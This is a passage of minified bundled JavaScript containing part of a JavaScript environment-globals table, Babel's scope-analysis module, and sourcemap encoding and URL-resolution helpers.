:!1,send:!1,start:!1,sum:!1},rhino:{defineClass:!1,deserialize:!1,gc:!1,help:!1,importClass:!1,importPackage:!1,java:!1,load:!1,loadClass:!1,Packages:!1,print:!1,quit:!1,readFile:!1,readUrl:!1,runCommand:!1,seal:!1,serialize:!1,spawn:!1,sync:!1,toint32:!1,version:!1},nashorn:{__DIR__:!1,__FILE__:!1,__LINE__:!1,com:!1,edu:!1,exit:!1,java:!1,Java:!1,javafx:!1,JavaImporter:!1,javax:!1,JSAdapter:!1,load:!1,loadWithNewGlobal:!1,org:!1,Packages:!1,print:!1,quit:!1},wsh:{ActiveXObject:!0,Enumerator:!0,GetObject:!0,ScriptEngine:!0,ScriptEngineBuildVersion:!0,ScriptEngineMajorVersion:!0,ScriptEngineMinorVersion:!0,VBArray:!0,WScript:!0,WSH:!0,XDomainRequest:!0},jquery:{$:!1,jQuery:!1},yui:{YAHOO:!1,YAHOO_config:!1,YUI:!1,YUI_config:!1},shelljs:{cat:!1,cd:!1,chmod:!1,config:!1,cp:!1,dirs:!1,echo:!1,env:!1,error:!1,exec:!1,exit:!1,find:!1,grep:!1,ln:!1,ls:!1,mkdir:!1,mv:!1,popd:!1,pushd:!1,pwd:!1,rm:!1,sed:!1,set:!1,target:!1,tempdir:!1,test:!1,touch:!1,which:!1},prototypejs:{$:!1,$$:!1,$A:!1,$break:!1,$continue:!1,$F:!1,$H:!1,$R:!1,$w:!1,Abstract:!1,Ajax:!1,Autocompleter:!1,Builder:!1,Class:!1,Control:!1,Draggable:!1,Draggables:!1,Droppables:!1,Effect:!1,Element:!1,Enumerable:!1,Event:!1,Field:!1,Form:!1,Hash:!1,Insertion:!1,ObjectRange:!1,PeriodicalExecuter:!1,Position:!1,Prototype:!1,Scriptaculous:!1,Selector:!1,Sortable:!1,SortableObserver:!1,Sound:!1,Template:!1,Toggle:!1,Try:!1},meteor:{_:!1,$:!1,Accounts:!1,AccountsClient:!1,AccountsCommon:!1,AccountsServer:!1,App:!1,Assets:!1,Blaze:!1,check:!1,Cordova:!1,DDP:!1,DDPRateLimiter:!1,DDPServer:!1,Deps:!1,EJSON:!1,Email:!1,HTTP:!1,Log:!1,Match:!1,Meteor:!1,Mongo:!1,MongoInternals:!1,Npm:!1,Package:!1,Plugin:!1,process:!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!1,ObjC:!1,ObjectSpecifier:!1,Path:!1,Progress:!1,Ref:!1},serviceworker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,CacheStorage:!1,clearInterval:!1,clearTimeout:!1,Client:!1,clients:!1,Clients:!1,close:!0,console:!1,ExtendableEvent:!1,ExtendableMessageEvent:!1,fetch:!1,FetchEvent:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!1,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onfetch:!0,oninstall:!0,onlanguagechange:!0,onmessage:!0,onmessageerror:!0,onnotificationclick:!0,onnotificationclose:!0,onoffline:!0,ononline:!0,onpush:!0,onpushsubscriptionchange:!0,onrejectionhandled:!0,onsync:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,registration:!1,removeEventListener:!1,Request:!1,Response:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerGlobalScope:!1,ServiceWorkerMessageEvent:!1,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,skipWaiting:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,WindowClient:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},atomtest:{advanceClock:!1,fakeClearInterval:!1,fakeClearTimeout:!1,fakeSetInterval:!1,fakeSetTimeout:!1,resetTimeouts:!1,waitsForPromise:!1},embertest:{andThen:!1,click:!1,currentPath:!1,currentRouteName:!1,currentURL:!1,fillIn:!1,find:!1,findAll:!1,findWithAssert:!1,keyEvent:!1,pauseTest:!1,resumeTest:!1,triggerEvent:!1,visit:!1,wait:!1},protractor:{$:!1,$$:!1,browser:!1,by:!1,By:!1,DartObject:!1,element:!1,protractor:!1},\"shared-node-browser\":{clearInterval:!1,clearTimeout:!1,console:!1,setInterval:!1,setTimeout:!1,URL:!1,URLSearchParams:!1},webextensions:{browser:!1,chrome:!1,opr:!1},greasemonkey:{cloneInto:!1,createObjectIn:!1,exportFunction:!1,GM:!1,GM_addStyle:!1,GM_deleteValue:!1,GM_getResourceText:!1,GM_getResourceURL:!1,GM_getValue:!1,GM_info:!1,GM_listValues:!1,GM_log:!1,GM_openInTab:!1,GM_registerMenuCommand:!1,GM_setClipboard:!1,GM_setValue:!1,GM_xmlhttpRequest:!1,unsafeWindow:!1},devtools:{$:!1,$_:!1,$$:!1,$0:!1,$1:!1,$2:!1,$3:!1,$4:!1,$x:!1,chrome:!1,clear:!1,copy:!1,debug:!1,dir:!1,dirxml:!1,getEventListeners:!1,inspect:!1,keys:!1,monitor:!1,monitorEvents:!1,profile:!1,profileEnd:!1,queryObjects:!1,table:!1,undebug:!1,unmonitor:!1,unmonitorEvents:!1,values:!1}}});var yS=E((xCe,mS)=>{\"use strict\";mS.exports=hS()});var dm=E(du=>{\"use strict\";Object.defineProperty(du,\"__esModule\",{value:!0});du.default=void 0;var yY=pS(),gY=Xr(),bY=dS(),EY=yS(),CS=De(),vY=CS,gS=Xs(),TY=ro(),{NOT_LOCAL_BINDING:bS,callExpression:ES,cloneNode:vS,getBindingIdentifiers:SY,identifier:qi,isArrayExpression:TS,isBinary:xY,isCallExpression:SS,isClass:PY,isClassBody:AY,isClassDeclaration:CY,isExportAllDeclaration:wS,isExportDefaultDeclaration:wY,isExportNamedDeclaration:cm,isFunctionDeclaration:DY,isIdentifier:Qs,isImportDeclaration:fm,isLiteral:IY,isMemberExpression:OY,isMethod:_Y,isModuleSpecifier:NY,isNullLiteral:kY,isObjectExpression:BY,isProperty:FY,isPureish:jY,isRegExpLiteral:LY,isSuper:MY,isTaggedTemplateExpression:RY,isTemplateLiteral:DS,isThisExpression:xS,isUnaryExpression:qY,isVariableDeclaration:UY,matchesPattern:PS,memberExpression:pm,numericLiteral:VY,toIdentifier:$Y,variableDeclaration:WY,variableDeclarator:KY,isRecordExpression:GY,isTupleExpression:HY,isObjectProperty:YY,isTopicReference:AS,isMetaProperty:XY,isPrivateName:JY,isExportDeclaration:zY,buildUndefinedNode:QY}=CS;function St(e,t){switch(e==null?void 0:e.type){default:if(fm(e)||zY(e)){var r;if((wS(e)||cm(e)||fm(e))&&e.source)St(e.source,t);else if((cm(e)||fm(e))&&(r=e.specifiers)!=null&&r.length)for(let n of e.specifiers)St(n,t);else(wY(e)||cm(e))&&e.declaration&&St(e.declaration,t)}else NY(e)?St(e.local,t):IY(e)&&!kY(e)&&!LY(e)&&!DS(e)&&t.push(e.value);break;case\"MemberExpression\":case\"OptionalMemberExpression\":case\"JSXMemberExpression\":St(e.object,t),St(e.property,t);break;case\"Identifier\":case\"JSXIdentifier\":t.push(e.name);break;case\"CallExpression\":case\"OptionalCallExpression\":case\"NewExpression\":St(e.callee,t);break;case\"ObjectExpression\":case\"ObjectPattern\":for(let n of e.properties)St(n,t);break;case\"SpreadElement\":case\"RestElement\":St(e.argument,t);break;case\"ObjectProperty\":case\"ObjectMethod\":case\"ClassProperty\":case\"ClassMethod\":case\"ClassPrivateProperty\":case\"ClassPrivateMethod\":St(e.key,t);break;case\"ThisExpression\":t.push(\"this\");break;case\"Super\":t.push(\"super\");break;case\"Import\":t.push(\"import\");break;case\"DoExpression\":t.push(\"do\");break;case\"YieldExpression\":t.push(\"yield\"),St(e.argument,t);break;case\"AwaitExpression\":t.push(\"await\"),St(e.argument,t);break;case\"AssignmentExpression\":St(e.left,t);break;case\"VariableDeclarator\":St(e.id,t);break;case\"FunctionExpression\":case\"FunctionDeclaration\":case\"ClassExpression\":case\"ClassDeclaration\":St(e.id,t);break;case\"PrivateName\":St(e.id,t);break;case\"ParenthesizedExpression\":St(e.expression,t);break;case\"UnaryExpression\":case\"UpdateExpression\":St(e.argument,t);break;case\"MetaProperty\":St(e.meta,t),St(e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)return;let i=r.getBinding(s.name);i==null||i.reference(e)}else if(UY(n))for(let s of n.declarations)for(let i of Object.keys(SY(s))){let a=r.getBinding(i);a==null||a.reference(e)}}},LabeledStatement(e){e.scope.getBlockParent().registerDeclaration(e)},AssignmentExpression(e,t){t.assignments.push(e)},UpdateExpression(e,t){t.constantViolations.push(e)},UnaryExpression(e,t){e.node.operator===\"delete\"&&t.constantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while(n&&!r);return(t=r)==null?void 0:t.scope}get parentBlock(){return this.path.parent}get hub(){return this.path.hub}traverse(t,r,n){(0,gY.default)(t,r,this,n,this.path)}generateDeclaredUidIdentifier(t){let r=this.generateUidIdentifier(t);return this.push({id:r}),vS(r)}generateUidIdentifier(t){return qi(this.generateUid(t))}generateUid(t=\"temp\"){t=$Y(t).replace(/^_+/,\"\").replace(/[0-9]+$/g,\"\");let r,n=1;do r=this._generateUid(t,n),n++;while(this.hasLabel(r)||this.hasBinding(r)||this.hasGlobal(r)||this.hasReference(r));let s=this.getProgramParent();return s.references[r]=!0,s.uids[r]=!0,r}_generateUid(t,r){let n=t;return r>1&&(n+=r),`_${n}`}generateUidBasedOnNode(t,r){let n=[];St(t,n);let s=n.join(\"$\");return s=s.replace(/^_/,\"\")||r||\"ref\",this.generateUid(s.slice(0,20))}generateUidIdentifierBasedOnNode(t,r){return qi(this.generateUidBasedOnNode(t,r))}isStatic(t){if(xS(t)||MY(t)||AS(t))return!0;if(Qs(t)){let r=this.getBinding(t.name);return r?r.constant:this.hasBinding(t.name)}return!1}maybeGenerateMemoised(t,r){if(this.isStatic(t))return null;{let n=this.generateUidIdentifierBasedOnNode(t);return r?n:(this.push({id:n}),vS(n))}}checkBlockScopedCollisions(t,r,n,s){if(r===\"param\"||t.kind===\"local\")return;if(r===\"let\"||t.kind===\"let\"||t.kind===\"const\"||t.kind===\"module\"||t.kind===\"param\"&&r===\"const\")throw this.hub.buildError(s,`Duplicate declaration \"${n}\"`,TypeError)}rename(t,r){let n=this.getBinding(t);n&&(r||(r=this.generateUidIdentifier(t).name),new yY.default(n,t,r).rename(arguments[2]))}_renameFromMap(t,r,n,s){t[r]&&(t[n]=s,t[r]=null)}dump(){let t=\"-\".repeat(60);console.log(t);let r=this;do{console.log(\"#\",r.block.type);for(let n of Object.keys(r.bindings)){let s=r.bindings[n];console.log(\" -\",n,{constant:s.constant,references:s.references,violations:s.constantViolations.length,kind:s.kind})}}while(r=r.parent);console.log(t)}toArray(t,r,n){if(Qs(t)){let a=this.getBinding(t.name);if(a!=null&&a.constant&&a.path.isGenericType(\"Array\"))return t}if(TS(t))return t;if(Qs(t,{name:\"arguments\"}))return ES(pm(pm(pm(qi(\"Array\"),qi(\"prototype\")),qi(\"slice\")),qi(\"call\")),[t]);let s,i=[t];return r===!0?s=\"toConsumableArray\":typeof r==\"number\"?(i.push(VY(r)),s=\"slicedToArray\"):s=\"toArray\",n&&(i.unshift(this.hub.addHelper(s)),s=\"maybeArrayLike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclaration())&&this.registerDeclaration(r)}else this.registerBinding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.getBinding(s))==null||n.reassign(t)}}registerBinding(t,r,n=r){if(!t)throw new ReferenceError(\"no `kind`\");if(r.isVariableDeclaration()){let a=r.get(\"declarations\");for(let o of a)this.registerBinding(t,o);return}let s=this.getProgramParent(),i=r.getOuterBindingIdentifiers(!0);for(let a of Object.keys(i)){s.references[a]=!0;for(let o of i[a]){let l=this.getOwnBinding(a);if(l){if(l.identifier===o)continue;this.checkBlockScopedCollisions(l,t,a,o)}l?this.registerConstantViolation(n):this.bindings[a]=new bY.default({identifier:o,scope:this,path:n,kind:t})}}}addGlobal(t){this.globals[t.name]=t}hasUid(t){let r=this;do if(r.uids[t])return!0;while(r=r.parent);return!1}hasGlobal(t){let r=this;do if(r.globals[t])return!0;while(r=r.parent);return!1}hasReference(t){return!!this.getProgramParent().references[t]}isPure(t,r){if(Qs(t)){let a=this.getBinding(t.name);return a?r?a.constant:!0:!1}else{if(xS(t)||XY(t)||AS(t)||JY(t))return!0;if(PY(t)){var n;return t.superClass&&!this.isPure(t.superClass,r)||((n=t.decorators)==null?void 0:n.length)>0?!1:this.isPure(t.body,r)}else if(AY(t)){for(let a of t.body)if(!this.isPure(a,r))return!1;return!0}else{if(xY(t))return this.isPure(t.left,r)&&this.isPure(t.right,r);if(TS(t)||HY(t)){for(let a of t.elements)if(a!==null&&!this.isPure(a,r))return!1;return!0}else if(BY(t)||GY(t)){for(let a of t.properties)if(!this.isPure(a,r))return!1;return!0}else if(_Y(t)){var s;return!(t.computed&&!this.isPure(t.key,r)||((s=t.decorators)==null?void 0:s.length)>0)}else if(FY(t)){var i;return!(t.computed&&!this.isPure(t.key,r)||((i=t.decorators)==null?void 0:i.length)>0||(YY(t)||t.static)&&t.value!==null&&!this.isPure(t.value,r))}else{if(qY(t))return this.isPure(t.argument,r);if(DS(t)){for(let a of t.expressions)if(!this.isPure(a,r))return!1;return!0}else return RY(t)?PS(t.tag,\"String.raw\")&&!this.hasBinding(\"String\",{noGlobals:!0})&&this.isPure(t.quasi,r):OY(t)?!t.computed&&Qs(t.object)&&t.object.name===\"Symbol\"&&Qs(t.property)&&t.property.name!==\"for\"&&!this.hasBinding(\"Symbol\",{noGlobals:!0}):SS(t)?PS(t.callee,\"Symbol.for\")&&!this.hasBinding(\"Symbol\",{noGlobals:!0})&&t.arguments.length===1&&vY.isStringLiteral(t.arguments[0]):jY(t)}}}}setData(t,r){return this.data[t]=r}getData(t){let r=this;do{let n=r.data[t];if(n!=null)return n}while(r=r.parent)}removeData(t){let r=this;do r.data[t]!=null&&(r.data[t]=null);while(r=r.parent)}init(){this.inited||(this.inited=!0,this.crawl())}crawl(){let t=this.path;this.references=Object.create(null),this.bindings=Object.create(null),this.globals=Object.create(null),this.uids=Object.create(null),this.data=Object.create(null);let r=this.getProgramParent();if(r.crawling)return;let n={references:[],constantViolations:[],assignments:[]};if(this.crawling=!0,t.type!==\"Program\"&&(0,TY.isExplodedVisitor)(pu)){for(let i of pu.enter)i.call(n,t,n);let s=pu[t.type];if(s)for(let i of s.enter)i.call(n,t,n)}t.traverse(pu,n),this.crawling=!1;for(let s of n.assignments){let i=s.getBindingIdentifiers();for(let a of Object.keys(i))s.scope.getBinding(a)||r.addGlobal(i[a]);s.scope.registerConstantViolation(s)}for(let s of n.references){let i=s.scope.getBinding(s.node.name);i?i.reference(s):r.addGlobal(s.node)}for(let s of n.constantViolations)s.scope.registerConstantViolation(s)}push(t){let r=this.path;r.isPattern()?r=this.getPatternParent().path:!r.isBlockStatement()&&!r.isProgram()&&(r=this.getBlockParent().path),r.isSwitchStatement()&&(r=(this.getFunctionParent()||this.getProgramParent()).path);let{init:n,unique:s,kind:i=\"var\",id:a}=t;if(!n&&!s&&(i===\"var\"||i===\"let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.create(null),r=this;do{for(let n of Object.keys(r.bindings))n in t||(t[n]=r.bindings[n]);r=r.parent}while(r);return t}getAllBindingsOfKind(...t){let r=Object.create(null);for(let n of t){let s=this;do{for(let i of Object.keys(s.bindings)){let a=s.bindings[i];a.kind===n&&(r[i]=a)}s=s.parent}while(s)}return r}bindingIdentifierEquals(t,r){return this.getBindingIdentifier(t)===r}getBinding(t){let r=this,n;do{let i=r.getOwnBinding(t);if(i){var s;if(!((s=n)!=null&&s.isPattern()&&i.kind!==\"param\"&&i.kind!==\"local\"))return i}else if(!i&&t===\"arguments\"&&r.path.isFunction()&&!r.path.isArrowFunctionExpression())break;n=r.path}while(r=r.parent)}getOwnBinding(t){return this.bindings[t]}getBindingIdentifier(t){var r;return(r=this.getBinding(t))==null?void 0:r.identifier}getOwnBindingIdentifier(t){let r=this.bindings[t];return r==null?void 0:r.identifier}hasOwnBinding(t){return!!this.getOwnBinding(t)}hasBinding(t,r){var n,s,i;return t?!!(this.hasOwnBinding(t)||(typeof r==\"boolean\"&&(r={noGlobals:r}),this.parentHasBinding(t,r))||!((n=r)!=null&&n.noUids)&&this.hasUid(t)||!((s=r)!=null&&s.noGlobals)&&e.globals.includes(t)||!((i=r)!=null&&i.noGlobals)&&e.contextVariables.includes(t)):!1}parentHasBinding(t,r){var n;return(n=this.parent)==null?void 0:n.hasBinding(t,r)}moveBindingTo(t,r){let n=this.getBinding(t);n&&(n.scope.removeOwnBinding(t),n.scope=r,r.bindings[t]=n)}removeOwnBinding(t){delete this.bindings[t]}removeBinding(t){var r;(r=this.getBinding(t))==null||r.scope.removeOwnBinding(t);let n=this;do n.uids[t]&&(n.uids[t]=!1);while(n=n.parent)}};du.default=so;so.globals=Object.keys(EY.builtin);so.contextVariables=[\"arguments\",\"undefined\",\"Infinity\",\"NaN\"]});var OS=E((hu,IS)=>{(function(e,t){typeof hu==\"object\"&&typeof IS!=\"undefined\"?t(hu):typeof define==\"function\"&&define.amd?define([\"exports\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.setArray={}))})(hu,function(e){\"use strict\";class t{constructor(){this._indexes={__proto__:null},this.array=[]}}function r(o){return o}function n(o,l){return o._indexes[l]}function s(o,l){let u=n(o,l);if(u!==void 0)return u;let{array:c,_indexes:f}=o,p=c.push(l);return f[l]=p-1}function i(o){let{array:l,_indexes:u}=o;if(l.length===0)return;let c=l.pop();u[c]=void 0}function a(o,l){let u=n(o,l);if(u===void 0)return;let{array:c,_indexes:f}=o;for(let p=u+1;p<c.length;p++){let m=c[p];c[p-1]=m,f[m]--}f[l]=void 0,c.pop()}e.SetArray=t,e.get=n,e.pop=i,e.put=s,e.remove=a,Object.defineProperty(e,\"__esModule\",{value:!0})})});var hm=E((mu,_S)=>{(function(e,t){typeof mu==\"object\"&&typeof _S!=\"undefined\"?t(mu):typeof define==\"function\"&&define.amd?define([\"exports\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.sourcemapCodec={}))})(mu,function(e){\"use strict\";let t=\",\".charCodeAt(0),r=\";\".charCodeAt(0),n=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\",s=new Uint8Array(64),i=new Uint8Array(128);for(let d=0;d<n.length;d++){let y=n.charCodeAt(d);s[d]=y,i[y]=d}let a=typeof TextDecoder!=\"undefined\"?new TextDecoder:typeof Buffer!=\"undefined\"?{decode(d){return Buffer.from(d.buffer,d.byteOffset,d.byteLength).toString()}}:{decode(d){let y=\"\";for(let v=0;v<d.length;v++)y+=String.fromCharCode(d[v]);return y}};function o(d){let y=new Int32Array(5),v=[],I=0;do{let D=l(d,I),O=[],_=!0,F=0;y[0]=0;for(let R=I;R<D;R++){let K;R=u(d,R,y,0);let te=y[0];te<F&&(_=!1),F=te,c(d,R,D)?(R=u(d,R,y,1),R=u(d,R,y,2),R=u(d,R,y,3),c(d,R,D)?(R=u(d,R,y,4),K=[te,y[1],y[2],y[3],y[4]]):K=[te,y[1],y[2],y[3]]):K=[te],O.push(K)}_||f(O),v.push(O),I=D+1}while(I<=d.length);return v}function l(d,y){let v=d.indexOf(\";\",y);return v===-1?d.length:v}function u(d,y,v,I){let D=0,O=0,_=0;do{let R=d.charCodeAt(y++);_=i[R],D|=(_&31)<<O,O+=5}while(_&32);let F=D&1;return D>>>=1,F&&(D=-2147483648|-D),v[I]+=D,y}function c(d,y,v){return y>=v?!1:d.charCodeAt(y)!==t}function f(d){d.sort(p)}function p(d,y){return d[0]-y[0]}function m(d){let y=new Int32Array(5),v=1024*16,I=v-36,D=new Uint8Array(v),O=D.subarray(0,I),_=0,F=\"\";for(let R=0;R<d.length;R++){let K=d[R];if(R>0&&(_===v&&(F+=a.decode(D),_=0),D[_++]=r),K.length!==0){y[0]=0;for(let te=0;te<K.length;te++){let se=K[te];_>I&&(F+=a.decode(O),D.copyWithin(0,I,_),_-=I),te>0&&(D[_++]=t),_=b(D,_,y,se,0),se.length!==1&&(_=b(D,_,y,se,1),_=b(D,_,y,se,2),_=b(D,_,y,se,3),se.length!==4&&(_=b(D,_,y,se,4)))}}}return F+a.decode(D.subarray(0,_))}function b(d,y,v,I,D){let O=I[D],_=O-v[D];v[D]=O,_=_<0?-_<<1|1:_<<1;do{let F=_&31;_>>>=5,_>0&&(F|=32),d[y++]=s[F]}while(_>0);return y}e.decode=o,e.encode=m,Object.defineProperty(e,\"__esModule\",{value:!0})})});var NS=E((mm,ym)=>{(function(e,t){typeof mm==\"object\"&&typeof ym!=\"undefined\"?ym.exports=t():typeof define==\"function\"&&define.amd?define(t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,e.resolveURI=t())})(mm,function(){\"use strict\";let e=/^[\\w+.-]+:\\/\\//,t=/^([\\w+.-]+:)\\/\\/([^@/#?]*@)?([^:/#?]*)(:\\d+)?(\\/[^#?]*)?(\\?[^#]*)?(#.*)?/,r=/^file:(?:\\/\\/((?![a-z]:)[^/#?]*)?)?(\\/?[^#?]*)(\\?[^#]*)?(#.*)?/i;var n;(function(v){v[v.Empty=1]=\"Empty\",v[v.Hash=2]=\"Hash\",v[v.Query=3]=\"Query\",v[v.RelativePath=4]=\"RelativePath\",v[v.AbsolutePath=5]=\"AbsolutePath\",v[v.SchemeRelative=6]=\"SchemeRelative\",v[v.Absolute=7]=\"Absolute\"})(n||(n={}));function s(v){return e.test(v)}function i(v){return v.startsWith(\"//\")}function a(v){return v.startsWith(\"/\")}function o(v){return v.startsWith(\"file:\")}function l(v){return/^[.?#]/.test(v)}function u(v){let I=t.exec(v);return f(I[1],I[2]||\"\",I[3],I[4]||\"\",I[5]||\"/\",I[6]||\"\",I[7]||\"\")}function c(v){let I=r.exec(v),D=I[2];return f(\"file:\",\"\",I[1]||\"\",\"\",a(D)?D:\"/\"+D,I[3]||\"\",I[4]||\"\")}function f(v,I,D,O,_,F,R){return{scheme:v,user:I,host:D,port:O,path:_,query:F,hash:R,type:n.Absolute}}function p(v){if(i(v)){let D=u(\"http:\"+v);return D.scheme=\"\",D.type=n.SchemeRelative,D}if(a(v)){let D=u(\"http://foo.com\"+v);return D.scheme=\"\",D.host=\"\",D.type=n.AbsolutePath,D}if(o(v))return c(v);if(s(v))return u(v);let I=u(\"http://foo.com/\"+v);return I.scheme=\"\",I.host=\"\",I.type=v?v.startsWith(\"?\")?n.Query:v.startsWith(\"#\")?n.Hash:n.RelativePath:n.Empty,I}function m(v){if(v.endsWith(\"/..\"))return v;let I=v.lastIndexOf(\"/\");return v.slice(0,I+1)}function b(v,I){d(I,I.type),v.path===\"/\"?v.path=I.path:v.path=m(I.path)+v.path}function d(v,I){let D=I<=n.RelativePath,O=v.path.split(\"/\"),_=1,F=0,R=!1;for(let te=1;te<O.length;te++){let se=O[te];if(!se){R=!0;continue}if(R=!1,se!==\".\"){if(se===\"..\"){F?(R=!0,F--,_--):D&&(O[_++]=se);continue}O[_++]=se,F++}}let K=\"\";for(let te=1;te<_;te++)K+=\"/\"+O[te];(!K||R&&!K.endsWith(\"/..\"))&&(K+=\"/\"),v.path=K}function y(v,I){if(!v&&!I)return\"\";let D=p(v),O=D.type;if(I&&O!==n.Absolute){let F=p(I),R=F.type;switch(O){case n.Empty:D.hash=F.hash;case n.Hash:D.query=F.query;case n.Query:case n.RelativePath:b(D,F);case n.AbsolutePath:D.user=F.user,D.host=F.host,D.port=F.port;case n.SchemeRelative:D.scheme=F.scheme}R>O&&(O=R)}d(D,O);let _=D.query+D.hash;switch(O){case n.Hash:case n.Query:return _;case n.RelativePath:{let F=D.path.slice(1);return F?l(I||v)&&!l(F)?\"./\"+F+_:F+_:_||\".\"}case n.AbsolutePath:return D.path+_;default:return D.scheme+\"//\"+D.user+D.host+D.port+D.path+_}}return y})});var gu=E((yu,kS)=>{(function(e,t){typeof yu==\"object\"&&typeof 